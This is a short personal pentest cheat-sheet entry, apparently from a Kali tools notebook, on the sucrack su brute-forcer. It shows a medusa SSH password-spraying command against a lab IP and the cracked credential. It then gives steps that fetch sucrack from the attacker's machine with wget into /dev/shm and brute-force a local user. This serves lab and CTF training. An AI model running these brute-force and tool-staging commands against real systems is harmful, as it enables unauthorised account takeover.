# 💢 sucrack
Tags: #💢
Related to: 
See also: [[nping]], [[ndiff]], [[ncat]]
Previous: [[00 KALI/Information Gathering]]

---
## Description
sucrack is a multithreaded Linux/UNIX tool brute-force cracking tool that drives su(1) with referencing a specific user and uses words from a wordlist as passwords. Running sucrack does not require high privileges on the target system.

---

## Usage Examples

### Attempt SSH logins

	medusa -h 10.129.189.141 -U users.txt -P passwords.txt -M ssh 10.129.189.141

```
-h [TEXT]    : Target hostname or IP address
-U [FILE]    : File containing usernames to test
-P [FILE]    : File containing passwords to test
-M [TEXT]    : Name of the module to execute (without the .mod extension)


ACCOUNT FOUND: [ssh] Host: 10.129.189.141 User: jimmy Password: n1nj4W4rri0R! [SUCCESS]
```

If we don't have SSH on our box, we can perform this on another box using sucrack:

	cp /usr/bin/sucrack www
	cd /dev/shm
	wget 10.10.14.120/sucrack
	chmod +x sucrack
	vi passwords.txt
	
```
n1nj4W4rri0R!
test
admin
```

	./sucrack -a -w 20 -s 10 -u jimmy -rl AFLafld passwords.txt



---
## References
- 